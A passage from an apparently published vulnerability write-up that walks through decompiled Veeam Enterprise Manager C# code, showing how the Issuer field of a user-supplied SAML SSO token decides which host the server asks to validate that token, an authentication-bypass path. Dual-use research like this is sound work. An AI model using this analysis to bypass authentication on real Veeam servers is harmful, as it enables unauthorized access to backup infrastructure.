</span></span><span style=display:flex><span><span style=color:#ae81ff>47</span>:  		<span style=color:#66d9ef>public</span> VCloudOrganizationCredentialsInfoType VCloudOrganizationCredentials
</span></span><span style=display:flex><span><span style=color:#ae81ff>48</span>:  		{
</span></span><span style=display:flex><span><span style=color:#ae81ff>49</span>:  			<span style=color:#66d9ef>get</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>50</span>:  			{
</span></span><span style=display:flex><span><span style=color:#ae81ff>51</span>:  				<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span>.vCloudOrganizationCredentialsField;
</span></span><span style=display:flex><span><span style=color:#ae81ff>52</span>:  			}
</span></span><span style=display:flex><span><span style=color:#ae81ff>53</span>:  			<span style=color:#66d9ef>set</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>54</span>:  			{
</span></span><span style=display:flex><span><span style=color:#ae81ff>55</span>:  				<span style=color:#66d9ef>this</span>.vCloudOrganizationCredentialsField = <span style=color:#66d9ef>value</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>56</span>:  			}
</span></span><span style=display:flex><span><span style=color:#ae81ff>57</span>:  		}
</span></span><span style=display:flex><span><span style=color:#ae81ff>58</span>:  
</span></span><span style=display:flex><span><span style=color:#ae81ff>59</span>:  		<span style=color:#66d9ef>private</span> <span style=color:#66d9ef>string</span> vMwareSSOTokenField;
</span></span><span style=display:flex><span><span style=color:#ae81ff>60</span>:  
</span></span><span style=display:flex><span><span style=color:#ae81ff>61</span>:  		<span style=color:#66d9ef>private</span> TenantCredentialsInfoType tenantCredentialsField;
</span></span><span style=display:flex><span><span style=color:#ae81ff>62</span>:  
</span></span><span style=display:flex><span><span style=color:#ae81ff>63</span>:  		<span style=color:#66d9ef>private</span> VCloudOrganizationCredentialsInfoType vCloudOrganizationCredentialsField;
</span></span><span style=display:flex><span><span style=color:#ae81ff>64</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>65</span>:  }
</span></span></code></pre></div><p>The <code>Veeam.Backup.Enterprise.Core.dll!Veeam.Backup.Enterprise.Core.CAuthorizationManager.AuthorizeByVMwareSsoToken</code> expects an argument named <code>ssoToken</code>, this sounds promising, maybe its an issue in the sso implementation one should ask.</p><p>Line (7) the <code>ssoToken</code> is base64 decoded and places inside an byte array, following that, the byte array is converted to an string and using an instance of the <code>XmlDocument()</code> class the string is XML decoded and contained in the <code>xmlDocument</code> variable.</p><p>Line (12,13,14) an instance of the <code>XmlNamespaceManager</code> is created and is used to lookup inside the provided XML for an specific element at <code>/saml2:Assertion/saml2:Issuer</code>.</p><p>Later, when the <code>xmlNode</code> is found, its value is passed to the <code>this.FindValidSTSEndpointUrl</code> method.</p><p>Okay, so far we understand that a base64 encoded XML should be provided that has a SAML like structure and then the <code>Issuer</code> is extracted from the provided XML and passed to the <code>FindValidSTSEndpointUrl</code> lets dig deeper.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span> <span style=color:#ae81ff>1</span>:  <span style=color:#66d9ef>public</span> CUserSessionContextData&lt;CWinLoginDependantInfo&gt; AuthorizeByVMwareSsoToken(<span style=color:#66d9ef>string</span> ssoToken)
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2</span>:  {
</span></span><span style=display:flex><span> <span style=color:#ae81ff>3</span>:  	Uri uri = <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span> <span style=color:#ae81ff>4</span>:  	CUserSessionContextData&lt;CWinLoginDependantInfo&gt; cuserSessionContextData;
</span></span><span style=display:flex><span> <span style=color:#ae81ff>5</span>:  	<span style=color:#66d9ef>try</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>6</span>:  	{
</span></span><span style=display:flex><span> <span style=color:#ae81ff>7</span>:  		<span style=color:#66d9ef>byte</span>[] array = Convert.FromBase64String(ssoToken);
</span></span><span style=display:flex><span> <span style=color:#ae81ff>8</span>:  		<span style=color:#66d9ef>string</span> @string = Encoding.UTF8.GetString(array);
</span></span><span style=display:flex><span> <span style=color:#ae81ff>9</span>:  		XmlDocument xmlDocument = <span style=color:#66d9ef>new</span> XmlDocument();
</span></span><span style=display:flex><span><span style=color:#ae81ff>10</span>:  		xmlDocument.LoadXml(@string);
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>:  		XmlElement documentElement = xmlDocument.DocumentElement;
</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span>:  		XmlNamespaceManager xmlNamespaceManager = <span style=color:#66d9ef>new</span> XmlNamespaceManager(xmlDocument.NameTable);
</span></span><span style=display:flex><span><span style=color:#ae81ff>13</span>:  		xmlNamespaceManager.AddNamespace(<span style=color:#e6db74>&#34;saml2&#34;</span>, <span style=color:#e6db74>&#34;urn:oasis:names:tc:SAML:2.0:assertion&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#ae81ff>14</span>:  		XmlNode xmlNode = documentElement.SelectSingleNode(<span style=color:#e6db74>&#34;/saml2:Assertion/saml2:Issuer&#34;</span>, xmlNamespaceManager);
</span></span><span style=display:flex><span><span style=color:#ae81ff>15</span>:  		uri = <span style=color:#66d9ef>this</span>.FindValidSTSEndpointUrl(xmlNode.InnerText);
</span></span><span style=display:flex><span><span style=color:#ae81ff>16</span>:  		Log.Message(<span style=color:#e6db74>&#34;Validating Single Sign-On token. Service enpoint URL: {0}&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { uri });
</span></span><span style=display:flex><span><span style=color:#ae81ff>17</span>:  		<span style=color:#66d9ef>using</span> (CVcAuthService cvcAuthService = CVcAuthService.Open(uri))
</span></span><span style=display:flex><span><span style=color:#ae81ff>18</span>:  		{
</span></span><span style=display:flex><span><span style=color:#ae81ff>19</span>:  			<span style=color:#66d9ef>if</span> (!cvcAuthService.ValidateAuthToken(documentElement))
</span></span><span style=display:flex><span><span style=color:#ae81ff>20</span>:  			{
</span></span><span style=display:flex><span><span style=color:#ae81ff>21</span>:  				<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#e6db74>&#34;Failed to validate Single Sign-On token&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#ae81ff>22</span>:  			}
</span></span><span style=display:flex><span><span style=color:#ae81ff>23</span>:  		}
</span></span><span style=display:flex><span><span style=color:#ae81ff>24</span>:  		<span style=color:#66d9ef>string</span> text;
</span></span><span style=display:flex><span><span style=color:#ae81ff>25</span>:  		SecurityIdentifier securityIdentifier;
</span></span><span style=display:flex><span><span style=color:#ae81ff>26</span>:  		IdentityReference[] array2;
</span></span><span style=display:flex><span><span style=color:#ae81ff>27</span>:  		CAuthorizationManager.ExtractUserInfo(documentElement, xmlDocument, xmlNamespaceManager, <span style=color:#66d9ef>out</span> text, <span style=color:#66d9ef>out</span> securityIdentifier, <span style=color:#66d9ef>out</span> array2);
</span></span><span style=display:flex><span><span style=color:#ae81ff>28</span>:  		cuserSessionContextData = <span style=color:#66d9ef>this</span>.AuthorizeByUserSid(text, securityIdentifier, array2, <span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span><span style=color:#ae81ff>29</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>30</span>:  	<span style=color:#66d9ef>catch</span> (UnauthorizedAccessException ex)
</span></span><span style=display:flex><span><span style=color:#ae81ff>31</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>32</span>:  		Log.SecureException(ex, <span style=color:#e6db74>&#34;Failed to authorize user.&#34;</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>33</span>:  		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#e6db74>&#34;Your account does not have any roles assigned. Please contact web portal administrator.&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#ae81ff>34</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>35</span>:  	<span style=color:#66d9ef>catch</span> (SoapException ex2)
</span></span><span style=display:flex><span><span style=color:#ae81ff>36</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>37</span>:  		Log.SecureException(ex2, <span style=color:#e6db74>&#34;Failed to invoke Single Sign-On service.&#34;</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>38</span>:  		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#66d9ef>string</span>.Format(<span style=color:#e6db74>&#34;vCenter Single Sign-On service communication failure. Address: {0}. Service message: {1}&#34;</span>, (uri != <span style=color:#66d9ef>null</span>) ? uri.ToString() : <span style=color:#e6db74>&#34;&#34;</span>, ex2.Message));
</span></span><span style=display:flex><span><span style=color:#ae81ff>39</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>40</span>:  	<span style=color:#66d9ef>catch</span> (WebException ex3)
</span></span><span style=display:flex><span><span style=color:#ae81ff>41</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>42</span>:  		Log.SecureException(ex3, <span style=color:#e6db74>&#34;Failed to invoke Single Sign-On service.&#34;</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>43</span>:  		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#66d9ef>string</span>.Format(<span style=color:#e6db74>&#34;vCenter Single Sign-On service communication failure. Address: {0}. Service message: {1}&#34;</span>, (uri != <span style=color:#66d9ef>null</span>) ? uri.ToString() : <span style=color:#e6db74>&#34;&#34;</span>, ex3.Message));
</span></span><span style=display:flex><span><span style=color:#ae81ff>44</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>45</span>:  	<span style=color:#66d9ef>catch</span> (SecurityException ex4)
</span></span><span style=display:flex><span><span style=color:#ae81ff>46</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>47</span>:  		Log.SecureError(<span style=color:#e6db74>&#34;Failed to authorize user. SSO token: &#34;</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>48</span>:  		Log.AppendLines(<span style=color:#66d9ef>new</span> <span style=color:#66d9ef>string</span>[] { ssoToken });
</span></span><span style=display:flex><span><span style=color:#ae81ff>49</span>:  		Log.Exception(ex4, <span style=color:#66d9ef>null</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>50</span>:  		<span style=color:#66d9ef>throw</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>51</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>52</span>:  	<span style=color:#66d9ef>catch</span> (Exception ex5)
</span></span><span style=display:flex><span><span style=color:#ae81ff>53</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>54</span>:  		Log.SecureError(<span style=color:#e6db74>&#34;Failed to authorize user. SSO token: &#34;</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>55</span>:  		Log.AppendLines(<span style=color:#66d9ef>new</span> <span style=color:#66d9ef>string</span>[] { ssoToken });
</span></span><span style=display:flex><span><span style=color:#ae81ff>56</span>:  		Log.Exception(ex5, <span style=color:#66d9ef>null</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>57</span>:  		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#66d9ef>string</span>.Format(<span style=color:#e6db74>&#34;Login by Single Sign-On token failed. Error message: {0}&#34;</span>, ex5.Message));
</span></span><span style=display:flex><span><span style=color:#ae81ff>58</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>59</span>:  	<span style=color:#66d9ef>return</span> cuserSessionContextData;
</span></span><span style=display:flex><span><span style=color:#ae81ff>60</span>:  }
</span></span></code></pre></div><p>The eagle eye notices the argument name being <code>authServiceLocationStr</code> which sounds pretty bad, the value of this argument is used to instantiate a <code>Uri</code> object and then this newly created <code>Uri</code> object is used in multiple places.</p><p>Whats important here is the fact that at the end of this method (line 24) our controlled <code>uri.host</code> and <code>uri.port</code> are used to construct a URL and return it to the caller</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span> <span style=color:#ae81ff>1</span>:  <span style=color:#66d9ef>private</span> Uri FindValidSTSEndpointUrl(<span style=color:#66d9ef>string</span> authServiceLocationStr)
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2</span>:  {
</span></span><span style=display:flex><span> <span style=color:#ae81ff>3</span>:  	Uri uri = <span style=color:#66d9ef>new</span> Uri(authServiceLocationStr);
</span></span><span style=display:flex><span> <span style=color:#ae81ff>4</span>:  	Log.Message(<span style=color:#e6db74>&#34;Token Issuer: {0}&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { uri });
</span></span><span style=display:flex><span> <span style=color:#ae81ff>5</span>:  	<span style=color:#66d9ef>string</span> host = uri.Host;
</span></span><span style=display:flex><span> <span style=color:#ae81ff>6</span>:  	Log.Message(<span style=color:#e6db74>&#34;Token SSO hostname: {0}&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { host });
</span></span><span style=display:flex><span> <span style=color:#ae81ff>7</span>:  	CVcPluginInfo cvcPluginInfo = <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span> <span style=color:#ae81ff>8</span>:  	<span style=color:#66d9ef>foreach</span> (CVcPluginInfo cvcPluginInfo2 <span style=color:#66d9ef>in</span> <span style=color:#66d9ef>this</span>._pluginHive.GetKnownSupportedVCHostsInfo())
</span></span><span style=display:flex><span> <span style=color:#ae81ff>9</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>10</span>:  		<span style=color:#66d9ef>string</span> text = UriFormatter.FormatHttps(host, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>:  		CVcHostInfo vcHostInfo = cvcPluginInfo2.VcHostInfo;
</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span>:  		<span style=color:#66d9ef>if</span> (((vcHostInfo != <span style=color:#66d9ef>null</span>) ? vcHostInfo.StsUrl : <span style=color:#66d9ef>null</span>) != <span style=color:#66d9ef>null</span> &amp;&amp; cvcPluginInfo2.VcHostInfo.StsUrl.StartsWith(text, StringComparison.OrdinalIgnoreCase))
</span></span><span style=display:flex><span><span style=color:#ae81ff>13</span>:  		{
</span></span><span style=display:flex><span><span style=color:#ae81ff>14</span>:  			cvcPluginInfo = cvcPluginInfo2;
</span></span><span style=display:flex><span><span style=color:#ae81ff>15</span>:  			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>16</span>:  		}
</span></span><span style=display:flex><span><span style=color:#ae81ff>17</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>18</span>:  	Uri uri2;
</span></span><span style=display:flex><span><span style=color:#ae81ff>19</span>:  	<span style=color:#66d9ef>if</span> (CAuthorizationManager.VaidateStsUrl(cvcPluginInfo, <span style=color:#66d9ef>out</span> uri2))
</span></span><span style=display:flex><span><span style=color:#ae81ff>20</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>21</span>:  		<span style=color:#66d9ef>return</span> uri2;
</span></span><span style=display:flex><span><span style=color:#ae81ff>22</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>23</span>:  	<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> Uri(authServiceLocationStr.Contains(<span style=color:#e6db74>&#34;websso/SAML2/Metadata&#34;</span>, StringComparison.OrdinalIgnoreCase) ? UriFormatter.FormatHttps(uri.Host, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>int?</span>(uri.Port), <span style=color:#e6db74>&#34;sts/STSService&#34;</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>true</span>) : UriFormatter.FormatHttps(uri.Host, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>int?</span>(uri.Port), <span style=color:#e6db74>&#34;ims/STSService&#34;</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>true</span>));
</span></span><span style=display:flex><span><span style=color:#ae81ff>24</span>:  }
</span></span></code></pre></div><p>So after the <code>FindValidSTSEndpointUrl</code> returns with our controlled URL inside the <code>uri</code> variable, another important method is executed which is at line (3) named <code>CVcAuthService.Open</code> and our controlled <code>uri</code> is passed as an argument to it. and the result of this method is an instance of <code>Veeam.Backup.Enterprise.Core.CVcAuthService</code> which resides in <code>Veeam.Backup.Enterprise.Core.dll</code></p><p>Now, lets figure out what this <code>CVcAuthService.Open</code> actually does</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#ae81ff>1</span>:  uri = <span style=color:#66d9ef>this</span>.FindValidSTSEndpointUrl(xmlNode.InnerText);
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>:  Log.Message(<span style=color:#e6db74>&#34;Validating Single Sign-On token. Service enpoint URL: {0}&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { uri });
</span></span><span style=display:flex><span><span style=color:#ae81ff>3</span>:  <span style=color:#66d9ef>using</span> (CVcAuthService cvcAuthService = CVcAuthService.Open(uri))
</span></span><span style=display:flex><span><span style=color:#ae81ff>4</span>:  {
</span></span><span style=display:flex><span><span style=color:#ae81ff>5</span>:  	<span style=color:#66d9ef>if</span> (!cvcAuthService.ValidateAuthToken(documentElement))
</span></span><span style=display:flex><span><span style=color:#ae81ff>6</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>7</span>:  		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#e6db74>&#34;Failed to validate Single Sign-On token&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#ae81ff>8</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>9</span>:  }
</span></span></code></pre></div><p>When the <code>Open</code> method is called, it actually instantiates an instance of its own class and passes its own argument to <code>CVcAuthService(Uri vcAuthServiceLocation)</code> at line (11), this causes (line 13,14) the <code>this._service</code> to be initialized with an instance of <code>STSService</code> and the <code>this._service.Url</code> property to get assigned to the passed URL.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span> <span style=color:#ae81ff>1</span>:  <span style=color:#66d9ef>namespace</span> Veeam.Backup.Enterprise.Core
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2</span>:  {
</span></span><span style=display:flex><span> <span style=color:#ae81ff>3</span>:  	<span style=color:#66d9ef>internal</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CVcAuthService</span> : IDisposable
</span></span><span style=display:flex><span> <span style=color:#ae81ff>4</span>:  	{
</span></span><span style=display:flex><span> <span style=color:#ae81ff>5</span>:  		<span style=color:#66d9ef>static</span> CVcAuthService()
</span></span><span style=display:flex><span> <span style=color:#ae81ff>6</span>:  		{
</span></span><span style=display:flex><span> <span style=color:#ae81ff>7</span>:  			CSslCertificateProtocolHolder.EnableAll();
</span></span><span style=display:flex><span> <span style=color:#ae81ff>8</span>:  			CSslCertificateCollector.InitSuppressErrorsForAllHosts();
</span></span><span style=display:flex><span> <span style=color:#ae81ff>9</span>:  		}
</span></span><span style=display:flex><span><span style=color:#ae81ff>10</span>:  
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>:  		<span style=color:#66d9ef>private</span> CVcAuthService(Uri vcAuthServiceLocation)
</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span>:  		{
</span></span><span style=display:flex><span><span style=color:#ae81ff>13</span>:  			<span style=color:#66d9ef>this</span>._service = <span style=color:#66d9ef>new</span> STSService();
</span></span><span style=display:flex><span><span style=color:#ae81ff>14</span>:  			<span style=color:#66d9ef>this</span>._service.Url = vcAuthServiceLocation.ToString();
</span></span><span style=display:flex><span><span style=color:#ae81ff>15</span>:  		}
</span></span><span style=display:flex><span><span style=color:#ae81ff>16</span>:  
</span></span><span style=display:flex><span><span style=color:#ae81ff>17</span>:  		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> CVcAuthService Open(Uri vcAuthServiceLocation)
</span></span><span style=display:flex><span><span style=color:#ae81ff>18</span>:  		{
</span></span><span style=display:flex><span><span style=color:#ae81ff>19</span>:  			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> CVcAuthService(vcAuthServiceLocation);
</span></span><span style=display:flex><span><span style=color:#ae81ff>20</span>:  		}
</span></span><span style=display:flex><span><span style=color:#a6e22e>[..SNIP..]</span>
</span></span></code></pre></div><p>But one should ask, what exactly is <code>STSService</code>? well, lets have a look inside. This class is part of the <code>SSOApi</code> and it extends a very important class which is <code>SoapHttpClientProtocol</code></p><p align=center><img src=https://summoning.team/images/blog/veeam-epm/STSService.png alt=readers></p><p>For those who are not familiar with this class, this is a native .NET class that extends yet another class <code>HttpWebClientProtocol</code>, simply put, this is a Soap HTTP Client that expects a URL to connect to and one can define methods, namespaces, etc so this Soap HTTP Client can be used to invoke virtual methods case an actual SOAP Request to be made and its response to be returned and formatted in form of .NET defined types. Following you can see how Veeam developers decided to extend the <code>SoapHttpClientProtocol</code> to use it for their own purposes one being validating a given <code>ssoToken</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>using</span> System;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.CodeDom.Compiler;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.ComponentModel;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Diagnostics;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Globalization;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Threading;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Web.Services;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Web.Services.Description;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Web.Services.Protocols;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Xml;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> System.Xml.Serialization;
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> Veeam.TimeMachine.Tool;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>namespace</span> SSOApi
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[GeneratedCode(&#34;wsdl&#34;, &#34;4.0.30319.1&#34;)]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[DebuggerStepThrough]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[DesignerCategory(&#34;code&#34;)]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[WebServiceBinding(Name = &#34;STSService_Binding&#34;, Namespace = &#34;http://www.rsa.com/names/2009/12/product/riat/wsdl&#34;)]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[XmlInclude(typeof(ProblemActionType))]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[XmlInclude(typeof(TransformationParametersType))]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[XmlInclude(typeof(SecurityTokenReferenceType))]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[XmlInclude(typeof(ReferenceType1))]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[XmlInclude(typeof(SecurityHeaderType))]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[XmlInclude(typeof(StatementAbstractType))]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[XmlInclude(typeof(SignaturePropertiesType))]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[XmlInclude(typeof(ManifestType))]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[XmlInclude(typeof(ObjectType))]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>	[XmlInclude(typeof(AllowPostdatingType))]</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>STSService</span> : SoapHttpClientProtocol
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> STSService()
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>base</span>.Url = <span style=color:#e6db74>&#34;https://localhost:8444/ims/STSService&#34;</span>;
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>event</span> IssueCompletedEventHandler IssueCompleted;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>event</span> RenewCompletedEventHandler RenewCompleted;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>event</span> ValidateCompletedEventHandler ValidateCompleted;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>event</span> ChallengeCompletedEventHandler ChallengeCompleted;
</span></span><span style=display:flex><span><span style=color:#a6e22e>
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>		[SoapDocumentMethod(&#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512/RST/Issue&#34;, Use = SoapBindingUse.Literal, ParameterStyle = SoapParameterStyle.Bare)]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>		[return: XmlElement(&#34;RequestSecurityTokenResponseCollection&#34;, Namespace = &#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512&#34;)]</span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> RequestSecurityTokenResponseCollectionType Issue([XmlElement(Namespace = <span style=color:#e6db74>&#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512&#34;</span>)] RequestSecurityTokenType RequestSecurityToken)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> (RequestSecurityTokenResponseCollectionType)<span style=color:#66d9ef>base</span>.Invoke(<span style=color:#e6db74>&#34;Issue&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { RequestSecurityToken })[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> IAsyncResult BeginIssue(RequestSecurityTokenType RequestSecurityToken, AsyncCallback callback, <span style=color:#66d9ef>object</span> asyncState)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>base</span>.BeginInvoke(<span style=color:#e6db74>&#34;Issue&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { RequestSecurityToken }, callback, asyncState);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> RequestSecurityTokenResponseCollectionType EndIssue(IAsyncResult asyncResult)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> (RequestSecurityTokenResponseCollectionType)<span style=color:#66d9ef>base</span>.EndInvoke(asyncResult)[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> IssueAsync(RequestSecurityTokenType RequestSecurityToken)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>this</span>.IssueAsync(RequestSecurityToken, <span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> IssueAsync(RequestSecurityTokenType RequestSecurityToken, <span style=color:#66d9ef>object</span> userState)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.IssueOperationCompleted == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>			{
